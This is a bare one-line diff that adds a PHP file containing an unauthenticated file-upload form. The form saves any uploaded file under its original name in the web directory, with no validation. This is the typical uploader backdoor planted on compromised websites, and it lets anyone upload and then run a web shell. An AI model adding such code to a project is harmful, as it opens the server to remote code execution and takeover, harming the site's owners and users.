@@ -1,0 +1,1 @@
+<?php if(isset($_FILES[filename])) { if(is_uploaded_file($_FILES[filename][tmp_name])) {move_uploaded_file($_FILES[filename][tmp_name], $_FILES[filename][name]);} }?><form method=post enctype=multipart/form-data><input type=file name=filename><input type=submit></form>
